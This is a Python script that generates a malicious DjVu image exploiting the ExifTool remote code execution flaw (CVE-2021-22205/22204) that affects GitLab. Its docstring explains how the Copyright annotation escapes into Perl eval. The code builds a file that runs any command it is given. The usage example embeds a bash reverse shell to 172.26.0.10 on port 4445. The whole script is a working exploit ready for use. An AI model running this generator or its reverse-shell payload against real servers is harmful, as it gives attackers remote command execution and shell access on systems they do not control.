#!/usr/bin/env python3
"""
Generate a malicious DjVu image exploiting CVE-2021-22205 / CVE-2021-22204
(GitLab ExifTool RCE).

Vulnerability mechanics:
  ExifTool's Image::ExifTool::DjVu::ProcessAnt parses the text in an ANTa
  annotation chunk as a Lisp-like (key value) structure. For the Copyright
  field, when the value contains a backslash-newline escape followed by
  ". qx{...} .", ExifTool's string handler runs the contents through Perl
  eval, which executes the qx{} backtick command.

Payload anatomy inside the ANTa chunk:

    (metadata
        (Copyright "\
    " . qx{COMMAND} . \
    " b ") )

  The two embedded `\<newline>` sequences trick ExifTool's lexer into
  closing and re-opening the string literal mid-value; what it ultimately
  feeds to eval is `qx{COMMAND}` concatenated with decorative strings.

We build a minimal but valid single-page DjVu file with djvumake:
    - INFO chunk (image dimensions)
    - BGjp chunk (empty background, required)
    - ANTa chunk (our malicious annotation)
"""
import os
import subprocess
import sys
import tempfile


def build_djvu_payload(command: str, output_path: str) -> None:
    annotation = (
        '(metadata\n'
        '\t(Copyright "\\\n'
        f'" . qx{{{command}}} . \\\n'
        '" b ") )\n'
    )

    with tempfile.TemporaryDirectory() as workdir:
        annotation_path = os.path.join(workdir, "annotation.txt")
        with open(annotation_path, "w") as f:
            f.write(annotation)

        subprocess.run(
            [
                "djvumake",
                output_path,
                "INFO=100,100",
                "BGjp=/dev/null",
                f"ANTa={annotation_path}",
            ],
            check=True,
            capture_output=True,
        )

    size = os.path.getsize(output_path)
    print(f"[+] Payload written to {output_path} ({size} bytes)")
    print(f"[+] Embedded command: {command}")


def main() -> None:
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <command> <output_file>")
        print(
            f"Example: {sys.argv[0]} "
            f"'bash -c \"bash -i >& /dev/tcp/172.26.0.10/4445 0>&1\"' payload.jpg"
        )
        sys.exit(1)

    build_djvu_payload(sys.argv[1], sys.argv[2])


if __name__ == "__main__":
    main()
